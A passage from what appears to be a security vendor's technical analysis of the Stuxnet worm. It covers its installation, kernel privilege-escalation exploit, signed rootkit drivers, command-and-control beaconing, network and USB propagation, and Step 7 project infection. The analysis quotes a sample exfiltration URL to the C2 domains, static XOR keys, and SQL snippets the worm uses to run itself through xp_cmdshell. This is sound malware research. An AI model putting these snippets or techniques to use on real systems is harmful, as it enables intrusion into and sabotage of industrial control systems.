implicate another\nparty.\n\nNext, Stuxnet reads a date from the configuration data (offset 0x8c in the configuration data). If the current date\nis later than the date in the configuration file then infection will also not occur and the threat will exit. The date\nfound in the current configuration file is June 24, 2012.\n\nStuxnet communicates between different components via global mutexes. Stuxnet tries to create such a global\nmutex but first it will use SetSecurityDescriptorDacl for computers running Windows XP and also the SetSecuri­\ntyDescriptorSacl API for computers running Windows Vista or later to reduce the integrity levels of objects, and\nthus ensure no write actions are denied.\n\nNext, Stuxnet creates 3 encrypted files. These files are read from the .stub section of Stuxnet; encrypted and\nwritten to disk, the files are:\n\n1. The main Stuxnet payload .dll file is saved as Oem7a.pnf\n\n2. A 90 byte data file copied to %SystemDrive%\\inf\\mdmeric3.PNF\n\n3. The configuration data for Stuxnet is copied to %SystemDrive%\\inf\\mdmcpq3.PNF\n\n4. A log file is copied to %SystemDrive%\\inf\\oem6C.PNF\n\nThen Stuxnet checks the date again to ensure the current date is before June 24, 2012.\n\nSubsequently Stuxnet checks whether it is the latest version or if the version encrypted on disk is newer. It does\nthis by reading the encrypted version from the disk, decrypting it, and loading it into memory. Once loaded Stux­\nnet calls export 6 from the newly loaded file; export 6 returns the version number of the newly loaded file from\nthe configuration data. In this way Stuxnet can read the version number from its own configuration data and\ncompare it with the version number from the file on disk. If the versions match then Stuxnet continues.\n\nProvided that the version check passed, Stuxnet will extract, decode, and write two files from the resources sec­\ntion to disk. The files are read from resource 201 and 242 and are written to disk as “Mrxnet.sys“ and “Mrxcls.\nsys” respectively. These are two driver files; one serves as the load point and the other is used to hide malicious\nfiles on the compromised computer and to replace the Stuxnet files on the disk if they are removed. The mechan­\nics of these two files are discussed in the Load Point and Rootkit Functionality sections respectively. When these\nfiles are created the file time on them is changed to match the times of other files in the system directory to\navoid suspicion. Once these files have been dropped Stuxnet creates the registry entries necessary to load these\nfiles as services that will automatically run when Windows starts.\n\nOnce Stuxnet has established that the rootkit was installed correctly it creates some more global mutexes to\nsignal that installation has occurred successfully.\n\nStuxnet passes control to two other exports to continue the installation and infection routines. Firstly, it injects\nthe payload .dll file into the services.exe process and calls export 32, which is responsible for infecting newly\nconnected removable drives and for starting the RPC server. Secondly, Stuxnet injects the payload .dll file into\nthe Step7 process S7tgtopx.exe and calls export 2. In order to succeed in this action, Stuxnet may need to kill the\nexplorer.exe and S7tgtopx.exe processes if they are running. Export 2 is used to infect all Step7 project files as\noutlined in the Step7 Project File Infection section.\n\nFrom here execution of Stuxnet continues via these 2 injections and via the driver files and services that were\ncreated.\n\n\n-----\n\nStuxnet then waits for a short while before trying to connect to the RPC server that was started by the export\n32 code. It will call function 0 to check it can successfully connect and then it makes a request to function 9 to\nreceive some information, storing this data in a log file called oem6c.pnf.\n\nAt this time, all the default spreading and payload routines have been activated.\n\n#### Windows Win32k.sys Local Privilege Escalation (MS10-073)\n\nStuxnet exploited a 0-day vulnerability in win32k.sys, used for local privilege escalation. The vulnerability was\npatched on October 12, 2010. The vulnerability resides in code that calls a function in a function pointer table;\nhowever, the index into the table is not validated properly allowing code to be called outside of the function\ntable.\n\nThe installation routine in Export 15, extracts and executes Resource 250, which contains a DLL that invokes the\nlocal privilege escalation exploit. The DLL contains a single export—Tml_1. The code first verifies that the execu­\ntion environment isn’t a 64-bit system and is Windows XP or Windows 2000.\n\nIf the snsm7551.tmp file exists execution ceases, otherwise the file ~DF540C.tmp is created, which provides an\nin-work marker.\n\nNext, win32k.sys is loaded into memory and the vulnerable function table pointer is found. Next, Stuxnet will ex­\namine the DWORDs that come after the function table to find a suitable DWORD to overload as a virtual address\nthat will be called. When passing in an overly large index into the function table, execution will transfer to code\nresiding at one of the DWORDs after the function table. These DWORDs are just data used elsewhere in win32k.\nsys, but hijacked by Stuxnet. For example, if the ASCII string ‘aaaa’ (DWORD 0x60606060) is located after the\nfunction table, Stuxnet will allocate shellcode at address 0x60606060 and then pass in an overly large function\ntable index that points to the DWORD ‘aaaa’ (0x60606060).\n\nBecause the available space at the address (in the above example 0x60606060) may be limited, Stuxnet uses\na two stage shellcode strategy. Memory is allocated for the main shellcode and at the chosen hijacked address,\nStuxnet only places a small piece of shellcode that will jump to the main shellcode.\n\nNext, Stuxnet drops a malformed keyboard layout file into the Temp directory with the file name ~DF<random>.\ntmp. The malformed keyboard layout file contains a byte that will result in the overly large index into the func­\ntion table. NtUserLoadKeyboardLayoutEx is called to load the malformed keyboard layout file successfully invok­\ning the exploit. The original keyboard layout is restored and then the malformed keyboard layout file is deleted.\n\nThe shellcode then loads the main Stuxnet DLL in the context of CSRSS.EXE.\n\n\n-----\n\n### Load Point\n\nStuxnet drops Resource 242 MrxCls.sys via Export 16. MrxCls is a driver digitally signed with a compromised\nRealtek certificate that was revoked on July 16, 2010 by Verisign. A different version of the driver was also found\nsigned by a different compromised digital certificate from JMicron.\n\nMrxcls.sys is a driver that allows Stuxnet to be executed every time an infected system boots and thus acts as\nthe main load-point for the threat. The driver is registered as a boot start service creating the registry key HKEY_\nLOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\MRxCls\\”ImagePath” = “%System%\\drivers\\mrxcls.sys”\nand thus loading early in the Windows boot process.\n\nThe goal of the driver is to inject and execute copies of Stuxnet into specific processes.\n\nThe driver contains an encrypted data block. After decryption, this block contains (among others) a registry key/\nvalue pair, which is normally HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\MrxCls\\“Data”.\n\nThe driver reads this binary value (previously set by Stuxnet during the installation process). The value is de­\ncrypted. It contains a list of pairs (target process name, module to inject):\n\n     - services.exe — %Windir%\\inf\\oem7A.PNF\n\n     - S7tgtopx.exe — %Windir%\\inf\\oem7A.PNF\n\n     - CCProjectMgr.exe — %Windir%\\inf\\oem7A.PNF\n\n     - explorer.exe — %Windir%\\inf\\oem7m.PNF\n\nThe services.exe, s7tgtopx.exe (Simatic manager) and CCProjectMgr.exe (WinCC project manager) will be inject­\ned with oem7a.pnf, which is a copy of the main Stuxnet dll. Once injected, Stuxnet executes on the compromised\ncomputer.\n\nExplorer.exe is injected with oem7m.pnf, an unknown file, which does not appear to be dropped by Stuxnet.\n\n\n-----\n\n### Command and Control\n\nAfter the threat has installed itself, dropped its files, and gathered some information about the system it con­\ntacts the command and control server on port 80 and sends some basic information about the compromised\ncomputer to the attacker via HTTP. Two command and control servers have been used in known samples:\n\n     - www[.]mypremierfutbol[.]com\n\n     - www[.]todaysfutbol[.]com\n\nThe two URLs above previously pointed to servers in Malaysia and Denmark; however they have since been\nredirected to prevent the attackers from controlling any compromised computers. The threat has the capability\nto update itself with new command and control domains, but we have not seen any files with updated configu­\nrations as yet. A configuration file named %Windir%\\inf\\mdmcpq3.PNF is read and the updated configuration\ninformation from that file is written to the main dll and the checksum of the dll is recalculated to ensure it is still\ncorrect.\n\nSystem data is gathered by export 28 and consists of the following information in the following format:\n\nPart 1:\n\n0x00 byte 1, fixed value\n0x01 byte from Configuration Data (at offset 14h)\n0x02 byte OS major version\n0x03 byte OS minor version\n0x04 byte OS service pack major version\n0x05 byte size of part 1 of payload\n0x06 byte unused, 0\n0x07 byte unused, 0\n0x08 dword from C. Data (at offset 10h, Sequence ID)\n0x0C word unknown\n0x0E word OS suite mask\n0x10 byte unused, 0\n0x11 byte flags\n0x12 string computer name, null-terminated\n0xXX string domain name, null-terminated\n\nPart 2, following part 1:\n\n0x00 dword IP address of interface 1, if any\n0x04 dword IP address of interface 2, if any\n0x08 dword IP address of interface 3, if any\n0x0C dword from Configuration Data (at offset 9Ch)\n0x10 byte unused, 0\n0x11 string copy of S7P string from C. Data (418h)\n\nNote that the payload contains the machine and domain name, as well as OS information. The flags at offset 11h\nhave the 4th bit set if at least one of the two registry values is found:\n\n     - HKEY_LOCAL_MACHINE\\Software\\Siemens\\Step7, value: STEP7_Version\n\n     - HKEY_LOCAL_MACHINE\\Software\\Siemens\\WinCC\\Setup, value: Version\n\nThis informs the attackers if the machine is running the targeted ICS programming software Siemens Step7 or\nWinCC.\n\nThe payload data is then XOR-ed with the byte value 0xFF.\n\nAfter the data is gathered, export #29 will then be executed (using the previously mentioned injection technique)\nto send the payload to a target server. The target process can be an existing Internet Explorer process (iexplore.\nexe), by default or if no iexplore.exe process is found the target browser process will be determined by examining\n\n\n-----\n\nthe registry key HKEY_CLASSES_ROOT\\HTTP\\SHELL\\OPEN\\COMMAND. A browser process is then created and\ninjected to run Export #29.\n\nExport #29 is used to send the above information to one of the malicious Stuxnet servers specified in the Con­\nfiguration Data block. First, one of the two below legitimate web servers referenced in the Configuration Data\nblock are queried, to test network connectivity:\n\n- www.windowsupdate.com\n\n- www.msn.com\n\nIf the test passes, the network packet is built. It has the following format:\n\n0x00 dword 1, fixed value\n0x04 clsid unknown\n0x14 byte[6] unknown\n0x1A dword IP address of main interface\n0x1E byte[size] payload\n\nThe payload is then XOR-ed with a static 31-byte long byte string found inside Stuxnet:\n\n0x67, 0xA9, 0x6E, 0x28, 0x90, 0x0D, 0x58, 0xD6, 0xA4, 0x5D, 0xE2, 0x72, 0x66, 0xC0, 0x4A, 0x57, 0x88, 0x5A,\n0xB0, 0x5C, 0x6E, 0x45, 0x56, 0x1A, 0xBD, 0x7C, 0x71, 0x5E, 0x42, 0xE4, 0xC1\n\nThe result is « hexified » (in order to transform binary data to an ascii string). For instance, the sequence of bytes\n(0x12, 0x34) becomes the string “1234”.\n\nThe payload is then sent to one of the two aforementioned URLs, as the “data” parameter. For example:\n\n[http://]www.mypremierfutbol.com/index.php?data=1234...\n\nUsing the HTTP protocol as well as pure ASCII parameters is a common way by malware (and legitimate applica­\ntions for that matter) to bypass corporate firewall blocking rules.\n\nThe malicious Stuxnet server processes the query and may send a response to the client. The response payload\nis located in the HTTP Content section. Contrary to the payload sent by the client, it is pure binary data. How­\never, it is encrypted with the following static 31-byte long XOR key:\n\n0xF1, 0x17, 0xFA, 0x1C, 0xE2, 0x33, 0xC1, 0xD7, 0xBB, 0x77, 0x26, 0xC0, 0xE4, 0x96, 0x15, 0xC4, 0x62, 0x2E,\n0x2D, 0x18, 0x95, 0xF0, 0xD8, 0xAD, 0x4B, 0x23, 0xBA, 0xDC, 0x4F, 0xD7, 0x0C\n\nThe decrypted server response has the following format:\n\n0x00 dword payload module size (n)\n0x04 byte command byte, can be 0 or 1\n0x05 byte[n] payload module (Windows executable)\n\nDepending on the command byte, the payload module is either loaded in the current process, or in a separate\nprocess via RPC. Then, the payload module’s export #1 is executed.\n\nThis feature gave Stuxnet backdoor functionality, as it had the possibility (before the *futbol* domains were\nblocked) to upload and run any code on an infected machine. At the time of writing no additional executables\nwere detected as being sent by the attackers, but this method likely allowed them to download and execute ad­\nditional tools or deliver updated versions of Stuxnet.\n\n\n-----\n\nFigure 12\n###### Command and Control\n\n\n-----\n\n### Windows Rootkit Functionality\n\nStuxnet has the ability to hide copies of its files copied to removable drives. This prevents users from noticing\nthat their removable drive is infected before sharing the removable drive to another party and also prevents\nthose users from realizing the recently inserted removable drive was the source of infection.\n\nStuxnet via Export 16 extracts Resource 201 as MrxNet.sys. The driver is registered as a service creating the fol­\nlowing registry entry:\n\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\MRxNet\\”ImagePath” = “%System%\\drivers\\\nmrxnet.sys”\n\nThe driver file is a digitally signed with a legitimate Realtek digital certificate. The certificate was confirmed as\ncompromised and revoked on July 16, 2010 by Verisign.\n\nThe driver scans the following filesystem driver objects:\n\n     - \\FileSystem\\ntfs\n\n     - \\FileSystem\\fastfat\n\n     - \\FileSystem\\cdfs\n\nA new device object is created by Stuxnet and attached to the device chain for each device object managed by\nthese driver objects. The MrxNet.sys driver will manage this driver object. By inserting such objects, Stuxnet is\nable to intercept IRP requests (example: writes, reads, to devices NTFS, FAT or CD-ROM devices).\n\nThe driver also registers to a filesystem registration callback routine in order to hook newly created filesystem\nobjects on the fly.\n\nThe driver monitors “directory control” IRPs, in particular “directory query” notifications. Such IRPs are sent to\nthe device when a user program is browsing a directory, and requests the list of files it contains for instance.\n\nTwo types of files will be filtered out from a query directory result:\n\n     - Files with a “.LNK” extension having a size of 4,171 bytes.\n\n     - Files named “~WTR[FOUR NUMBERS].TMP”, whose size is between 4Kb and 8Mb; the sum of the four numbers\n\nmodulo 10 is null. For example, 4+1+3+2=10=0 mod 10\n\nThese filters hide the files used by Stuxnet to spread through removable drives, including:\n\n     - Copy of Copy of Copy of Copy of Shortcut to.lnk\n\n     - Copy of Copy of Copy of Shortcut to.lnk\n\n     - Copy of Copy of Shortcut to.lnk\n\n     - Copy of Shortcut to.lnk\n\n     - ~wtr4132.tmp\n\n     - ~wtr4141.tmp\n\nIn the driver file, the project path b:\\myrtus\\src\\objfre_w2k_x86\\i386 \\guava.pdb was not removed.\n\nGuavas are plants in the myrtle (myrtus) family genus. The string could have no significant meaning; however, a\nvariety of interpretations have been discussed. Myrtus could be “MyRTUs”. RTU stands for remote terminal unit\nand are similar to a PLC and, in some environments, used as a synonym for PLCs. In addition, according to Wiki­\npedia, “Esther was originally named Hadassah. Hadassah means ‘myrtle’ in Hebrew.” Esther learned of a plot to\nassassinate the king and “told the king of Haman’s plan to massacre all Jews in the Persian Empire...The Jews\nwent on to kill only their would-be executioners.” Symantec cautions readers on drawing any attribution conclu­\nsions. Attackers would have the natural desire to implicate another party.\n\n\n-----\n\n### Stuxnet Propagation Methods\n\nStuxnet has the ability to propogate using a variety of methods. Stuxnet propagates by infecting removable\ndrives and also by copying itself over the network using a variety of means, including two exploits. In addition,\nStuxnet propagates by copying itself to Step 7 projects using a technique that causes Stuxnet to auto-execute\nwhen opening the project. The following sections describe the network, removable drive, and Step 7 project\npropagation routines.\n\n#### Network propagation routines\n\nExport 22 is responsible for the majority of the network propagation routines that Stuxnet uses. This export\nbuilds a “Network Action” class that contains 5 subclasses. Each subclass is responsible for a different method\nof infecting a remote host.\n\nThe functions of the 5 subclasses are:\n\n     - Peer-to-peer communication and updates\n\n     - Infecting WinCC machines via a hardcoded database server password\n\n     - Propagating through network shares\n\n     - Propagating through the MS10-061 Print Spooler Zero-Day Vulnerability\n\n     - Propagating through the MS08-067 Windows Server Service Vulnerability\n\nEach of these classes is discussed in more detail below.\n\n##### Peer-to-peer communication\n\nThe P2P component works by installing an RPC server and client. When the threat infects a computer it starts\nthe RPC server and listens for connections. Any other compromised computer on the network can connect to the\nRPC server and ask what version of the threat is installed on the remote computer.\n\nIf the remote version is newer then the local computer will make a request for the new version and will update\nitself with that. If the remote version is older the local computer will prepare a copy of itself and send it to the\nremote computer so that it can update itself. In this way an update can be introduced to any compromised com­\nputer on a network and it will eventually spread to all other compromised computers.\n\nAll of the P2P requests take place over RPC as outlined below.\n\nThe RPC server offers the following routines. (Note that RPC methods 7, 8, 9 are not used by Stuxnet.)\n\n\n\n- 0: Returns the version\n\nnumber of Stuxnet\ninstalled\n\n- 1: Receive an .exe\n\nfile and execute it\n(through injection)\n\n- 2: Load module and\n\nexecuted export\n\n- 3: Inject code into\n\nlsass.exe and run it\n\n- 4: Builds the latest\n\nversion of Stuxnet and\nsends to compromised\ncomputer\n\n- 5: Create process\n\n- 6: Read file\n\n- 7: Drop file\n\n- 8: Delete file\n\n- 9: Write data records\n\n\nFigure 13\n###### Example of an old client requesting latest version of Stuxnet via P2P\n\n\n-----\n\nThe RPC client makes the following requests:\n\n1. Call RPC function 0 to get remote version number.\n\n2. Check if remote version number is newer than local version number.\n\n3. If remote version number is newer then:\n\n1. Call RPC function 4 to request latest Stuxnet exe\n2. Receive the latest version of Stuxnet\n3. Install it locally (via process injection)\n4. If the remote version number is older then:\n\n1. Prepare a standalone .exe file of the local Stuxnet version.\n2. Send the .exe file to the remote computer by calling RPC function 1.\n\nWhen trying to connect to a remote RPC server this class uses the following logic.\n\nIt will attempt to call RPC function 0 on each of the following bindings in turn, if any RPC call succeeds then\nStuxnet proceeds with that binding:\n\n1. ncacn_ip_tcp:IPADDR[135]\n\n2. ncacn_np:IPADDR[\\\\pipe\\\\ntsvcs]\n\n3. ncacn_np:IPADDR[\\\\pipe\\\\browser]\n\nIt will then try to impersonate the anonymous token and try the following binding:\n\n4. ncacn_np:IPADDR[\\\\pipe\\\\browser]\n\nIt then reverts to its own token and finally tries to enumerate through the service control manager (SCM) looking\nfor any other bindings that may be available:\n\n5. ncacn_ip_tcp:IPADDR (searches in the SCM for available services)\n\nIf any of the above bindings respond correctly to RPC function 0 then Stuxnet has found a remote compromised\ncomputer. RPC function 0 returns the version number of the remote Stuxnet infection. Based on this version\nnumber Stuxnet will either send a copy of itself to the remote computer or it will request a copy of the latest ver­\nsion from the remote computer and install it.\n\nRPC function 1 is called in order to receive the latest version from the remote computer and RPC function 4 is\ncalled to send the latest version of Stuxnet to the remote computer.\n\nOf course Stuxnet does not simply execute the received executable. Instead, it injects it into a chosen process\nand executes it that way as outlined in the Injection Technique section.\n\nFurthermore, Stuxnet is actually a .dll file so in order to send an executable version of itself to the attacker\nStuxnet must first build an executable version of itself. It does this by reading in a template .exe from resource\n210 and populating it with all of the addition detail that is needed to make an executable version of the currently\ninstalled Stuxnet version, including the latest configuration data and information about the currently compro­\nmised computer.\n\nBecause the peer-to-peer mechanism occurs through RPC, it is unlikely as an alternative method of command\nand control as RPC generally is only effective within a local area network (LAN). The purpose of the peer-to-peer\nmechanism is likely to allow the attackers to reach computers that do not have outbound access to the general\nInternet, but can communicate with other computers on the LAN that have been infected and are able to contact\nthe command and control servers.\n\n##### Infecting WinCC computers\n\nThis class is responsible for connecting to a remote server running the WinCC database software. When it finds\na system running this software it connects to the database server using a password that is hardcoded within the\nWinCC software. Once it has connected it performs two actions. First, Stuxnet sends malicious SQL code to the\ndatabase that allows a version of Stuxnet to be transferred to the computer running the WinCC software and\nexecutes it, thereby infecting the computer that is running the WinCC database. Second, Stuxnet modifies an\nexisting view adding code that is executed each time the view is accessed.\n\n\n-----\n\nAfter sending an SQL configuration query, Stuxnet sends an SQL statement that creates a table and inserts a\nbinary value into the table. The binary value is a hex string representation of the main Stuxnet DLL as an execut­\nable file (formed using resource 210) and an updated configuration data block.\n\nCREATE TABLE sysbinlog ( abin image ) INSERT INTO sysbinlog VALUES(0x…)\n\nIf successful, Stuxnet uses OLE Automation Stored Procedures to write itself from the database to disk as\n%UserProfile%\\sql[RANDOM VALUE].dbi.\n\nThe file is then added as a stored procedure and executed.\n```\nSET @ainf = @aind + ‘\\\\sql%05x.dbi’\n\nEXEC sp _ addextendedproc sp _ dumpdbilog, @ainf\n\nEXEC sp _ dumpdbilog\n\n```\nThe stored procedure is then deleted and the main DLL file is also deleted.\n\nOnce running locally on a computer with WinCC installed, Stuxnet will also save a .cab file derived from resource\n203 on the computer as GracS\\cc_tlg7.sav. The .cab file contains a bootstrap DLL meant to load the main Stux­\nnet DLL, located in GracS\\cc_alg.sav. Next, Stuxnet will then modify a view to reload itself. Stuxnet modifies the\nMCPVREADVARPERCON view to parse the syscomments.text field for additional SQL code to execute. The SQL\ncode stored in syscomments.text is placed between the markers –CC-SP and --*.\n\nIn particular, Stuxnet will store and execute SQL code that will extract and execute Stuxnet from the saved CAB\nfile using xp_cmdshell.\n```\nset @t=left(@t,len(@t)-charindex(‘\\\\’,reverse(@t)))+’\\GraCS\\cc _ tlg7.sav’;\n\nset @s = ‘master..xp _ cmdshell ‘’extrac32 /y “’+@t+’” “’+@t+’x”’’’;\n\nexec(@s);\n\n```\nThen, the extracted DLL will be added as a stored procedure, executed, and deleted. This allows Stuxnet to ex­\necute itself and ensure it remains resident.\n\n##### Propagation through network shares\n\nStuxnet also can spread to available network shares through either a scheduled job or using Windows Manage­\nment Instrumentation (WMI).\n\nStuxnet will enumerate all user accounts of the computer and the domain, and try all available network resourc­\nes either using the user’s credential token or using WMI operations with the explorer.exe token in order to copy\nitself and execute on the remote share.\n\nStuxnet will determine if the ADMIN$ share is accessible to build the share name of the main drive (e.g.: C$). An\nexecutable is built using resource 210 and customized with the main DLL code and the latest configuration data\nblock. After enumerating the directories of the network resource, the executable is copied as a random file name\nin the form DEFRAG[RANDLNT].tmp. Next, a network job is scheduled to execute the file two minutes after infec­\ntion.\n\nThe same process occurs except using WMI with the explorer.exe token instead of using the user’s credential\ntoken.\n\n##### MS10-061 Print Spooler zero-day vulnerability\n\n[This is the zero day Print Spooler vulnerability patched by Microsoft in MS10-061. Although at first it was](http://www.microsoft.com/technet/security/bulletin/ms10-061.mspx)\nthought that this was a privately found/disclosed vulnerability, it was later discovered that this vulnerability\nwas actually first released in the 2009-4 edition of the security magazine Hakin9 and had been public since that\ntime, but had not been seen to be used in the wild.\n\n\n-----\n\nThis vulnerability allows a file to be written to the %System% folder of vulnerable machines. The actual code to\ncarry out the attack is stored in resource 222; this export loads the DLL stored in that resource and prepares the\nparameters needed to execute the attack, namely an IP address and a copy of the worm, and then calls export\none from the loaded DLL. Using this information, Stuxnet is able to copy itself to remote computers as %Sys­\ntem%\\winsta.exe through the Printer Spooler, and then execute itself. Winsta.exe may contain multiple copies of\nStuxnet and grow abnormally large.\n\nStuxnet will only attempt to use MS10-061 if the current date is before June 1, 2011.\n\n##### MS08-067 Windows Server Service vulnerability\n\n[In addition, Stuxnet also exploits MS08-067, which is the same vulnerability utilized by W32.Downadup. MS08-](http://www.microsoft.com/technet/security/bulletin/ms08-067.mspx)\n067 can be exploited by connecting over SMB and sending a malformed path string that allows arbitrary execu­\ntion. Stuxnet uses this vulnerability to copy itself to unpatched remote computers.\n\nStuxnet will verify the following conditions before exploiting MS08-67:\n\n- The current date must be before January 1, 2030\n\n- Antivirus definitions for a variety of antivirus products dated before January 1, 2009\n\n- Kernel32.dll and Netapi32.dll timestamps after October 12, 2008 (before patch day)\n\n\n-----\n\n#### Removable drive propagation\n\nOne of the main propagation methods Stuxnet uses is to copy itself to inserted removable drives. Industrial\ncontrol systems are commonly programmed by a Windows computer that is non-networked and operators often\nexchange data with other computers using removable drives. Stuxnet used two methods to spread to and from\nremovable drives—one method using a vulnerability that allowed auto-execution when viewing the removable\ndrive and the other using an autorun.inf file.\n\n##### LNK Vulnerability (CVE-2010-2568)\n\nStuxnet will copy itself and its supporting files to available removable drives any time a removable drive is\ninserted, and has the ability to do so if specifically instructed. The removable-drive copying is implemented by\nexports 1, 19, and 32. Export 19 must be called by other code and then it performs the copying routine immedi­\nately. Exports 1 and 32 both register routines to wait until a removable drive is inserted. The exports that cause\nreplication to removable drives will also remove infections on the removable drives, depending on a configura­\ntion value stored in the configuration data block. Different circumstances will cause Stuxnet to remove the files\nfrom an infected removable drive. For example, once the removable drive has infected three computers, the files\non the removable drive will be deleted.\n\nIf called from Export 1 or 32, Stuxnet will first verify it is running within services.exe, and determines which\nversion of Windows it is running on. Next, it creates a new hidden window with the class name ‘AFX64c313’ that\nwaits for a removable drive to be inserted (via the WM_DEVICECHANGE message), verifies it contains a logical\nvolume (has a type of DBT_DEVTYP_VOLUME), and is a removable drive (has a drive type of DEVICE_REMOV­\nABLE). Before infecting the drive, the current time must be before June 24, 2012.\n\nNext, Stuxnet determines the drive letter of the newly inserted drive and reads in the configuration data to de­\ntermine if it should remove itself from the removable drive or copy itself to the removable drive. When removing\nitself, it deletes the following files:\n\n   - %DriveLetter%\\~WTR4132.tmp\n\n   - %DriveLetter%\\~WTR4141.tmp\n\n   - %DriveLetter%\\Copy of Shortcut to.lnk\n\n   - %DriveLetter%\\Copy of Copy of Shortcut to.lnk\n\n   - %DriveLetter%\\Copy of Copy of Copy of Shortcut to.lnk\n\n   - %DriveLetter%\\Copy of Copy of Copy of Copy of Shortcut to.lnk\n\nIf the removable drive should be infected, the drive is first checked to see if it is suitable, checking the following\nconditions:\n\n   - The drive was not just infected, determined by the current time.\n\n   - The configuration flag to infect removable drives must be set, otherwise infections occur depending on the\n\ndate, but this is not set by default.\n\n   - The infection is less than 21 days old.\n\n   - The drive has at least 5MB of free space.\n\n   - The drive has at least 3 files.\n\nIf these conditions are met, the following files are created:\n\n   - %DriveLetter%\\~WTR4132.tmp (~500Kb)\n\n(This file contains Stuxnet’s main DLL in the stub section and is derived from Resource 210.)\n\n   - %DriveLetter%\\~WTR4141.tmp (~25Kb)\n\n(This file loads ~WTR4132.tmp and is built from Resource 241.)\n\n   - %DriveLetter%\\Copy of Shortcut to.lnk\n\n   - %DriveLetter%\\Copy of Copy of Shortcut to.lnk\n\n   - %DriveLetter%\\Copy of Copy of Copy of Shortcut to.lnk\n\n   - %DriveLetter%\\Copy of Copy of Copy of Copy of Shortcut to.lnk\n\n\n-----\n\nThe .lnk files are created using Resource 240 as a template and four are needed as each specifically targets one\nor more different versions of Windows including Windows 2000, Windows XP, Windows Server 2003, Windows\nVista, and Windows 7. The .lnk files contain an exploit that will automatically execute ~WTR4141.tmp when sim­\nply viewing the folder.\n\n~WTR4141.tmp then loads ~WTR4132.tmp, but before doing so, it attempts to hide the files on the removable\ndrive. Hiding the files on the removable drive as early in the infection process as possible is important for the\nthreat since the rootkit functionality is not installed yet, as described in the Windows Rootkit Functionality sec­\ntion. Thus, ~WTR4141.tmp implements its own less-robust technique in the meantime.\n\n~WTR4141.tmp hooks the following APIs from kernel32.dll and Ntdll.dll:\n\nFrom Kernel32.dll\n\n- FindFirstFileW\n\n- FindNextFileW\n\n- FindFirstFileExW\n\nFrom Ntdll.dll\n\n- NtQueryDirectoryFile\n\n- ZwQueryDirectoryFile\n\nIt replaces the original code for these functions with code that checks for files with the following properties:\n\n- Files with an .lnk extension having a size of 4,171 bytes.\n\n- Files named ~WTRxxxx.TMP, sized between 4Kb and 8 Mb, where xxxx is:\n\n  - 4 decimal digits. (~wtr4132.tmp)\n\n  - The sum of these digits modulo 10 is null. (Example: 4+1+3+2=10=0 mod 10)\n\nIf a request is made to list a file with the above properties, the response from these APIs is altered to state that\nthe file does not exist, thereby hiding all files with these properties.\n\nAfter the DLL APIs are hooked, ~WTR4132.tmp is loaded. To load a .dll file normally, a program calls the “Load­\nLibrary” API with the file name of the .dll file to be loaded into memory. W32.Stuxnet uses a different approach,\nnot just in the first .dll file Figure 14\nbut in several different USB Execution Flow\nparts of the code. This\nmethod is described in\nthe Bypassing Behavior\nBlocking When Loading\nDLLs section.\n\n~WTR4132.tmp contains\nthe main Stuxnet DLL in\nthe .stub section. This is\nextracted into memory\nand then Export 15 of\nthe DLL is called execut­\ning the installation of\nStuxnet. Export 15 is\ndescribed in the Installa­\ntion section.\n\nThe diagram to the right\ndescribes the execution\nflow.\n\n\n-----\n\n##### AutoRun.Inf\n\nPrevious versions of Stuxnet did not use the LNK 0-day exploit, but instead spread via an autorun.inf file. Re­\nsource 207 is a 500kb file that was only present in the older version of Stuxnet, and was removed in the new\nversion.\n\nAn autorun.inf file is a configuration file placed on removable drives that instructs Windows to automatically ex­\necute a file on the removable drive when the drive is inserted. Typically, one would place the autorun.inf file and\nexecutable in the root directory of the drive. However, Stuxnet uses a single file. Resource 207 is an executable\nfile and also contains a correctly formatted autorun.inf data section at the end.\n\nWhen autorun.inf files are parsed by the Windows OS, the parsing is quite forgiving, meaning that any charac­\nters that are not understood as legitimate autorun commands are skipped. Stuxnet uses this to its advantage by\nplacing the MZ file first inside the autorun.inf file. During parsing of the autorun.inf file all of the MZ file will be\nignored until the legitimate autorun commands that are appended at the end of the file are encountered. See the\nheader and footer of the autorun.inf file as shown in the following diagrams.\n\nFigure 15\n###### Autorun.inf header\n\nFigure 16\n###### Autorun.inf footer\n\nWhen we show only the strings from the footer we can see that they are composed of legitimate autorun com­\nmands:\n\nFigure 17\n###### Hidden autorun commands\n\nNotice that Stuxnet uses the autorun commands to specify the file to execute as the actual autorun.inf file. Using\nthis trick, the autorun.inf file will be treated as a legitimate autorun.inf file first and later as a legitimate execut­\nable file.\n\n\n-----\n\nIn addition to this, Stuxnet also uses another trick to enhance the chances\nthat it will be executed. The autorun commands turn off autoplay and then\nadd a new command to the context menu. The command that is added is\nfound in %Windir%\\System32\\shell32.dll,-8496. This is actually the “Open”\nstring. Now when viewing the context menu for the removable device the user\nwill actually see two “Open” commands.\n\nOne of these Open commands is the legitimate one and one is the command\nadded by Stuxnet. If a user chooses to open the drive via this menu, Stuxnet\nwill execute first. Stuxnet then opens the drive to hide that anything suspi­\ncious has occurred.\n\n\nFigure 18\n###### Two “Open” commands\n\n\n-----\n\n#### Step 7 Project File Infections\n\nThe main export, Export 16, calls Export 2, which is used to hook specific APIs that are used to open project files\ninside the s7tgtopx.exe process. This process is the WinCC Simatic manager, used to manage a WinCC/Step7\nproject.\n\nThe Import Address Tables of the following DLLs are modified:\n\n   - In s7apromx.dll, mfc42.dll, and msvcrt.dll, CreateFileA is replaced to point to “CreateFileA_hook”.\n\n   - In ccprojectmgr.exe, StgOpenStorage is replaced to point to “StgOpenStorage_hook”.\n\nCreateFileA is typically used to open *.S7P projects (Step7 project files). Instead, the CreateFileA_hook routine\nwill be called. If the file opened has the extension .s7p, CreateFileA_hook will call RPC function #9, which is\nresponsible for recording this path to the encrypted datafile %Windir%\\inf\\oem6c.pnf, and eventually infect the\nproject folder inside which the s7p file is located.\n\nStgOpenStorage is used by the Simatic manager to open *.MCP files. These files are found inside Step7 projects.\nLike CreateFileA_hook, StgOpenStorage_hook will monitor files with the *.mcp extension. If such a file is ac­\ncessed by the manager, the hook function will call RPC function #9 to record the path to oem6c.pnf and eventu­\nally infect the project folder inside which the mcp file is located.\n\nExport 14 is the main routine for infecting Step 7 project files.\n\nThe project infector routine takes a path to a project as input, and can infect it causing Stuxnet to execute when\nthe project is loaded. The project path may be a regular path to a directory, or a path to zip file containing the\nproject.\n\nFiles inside the projects are listed. Those with extensions .tmp, .s7p or .mcp receive special processing.\n\n##### S7P files\n\nFiles with such extensions are Step7 project files. When such a file is found inside a project folder, the project\nmay be infected.\n\nThe project is a candidate for infection 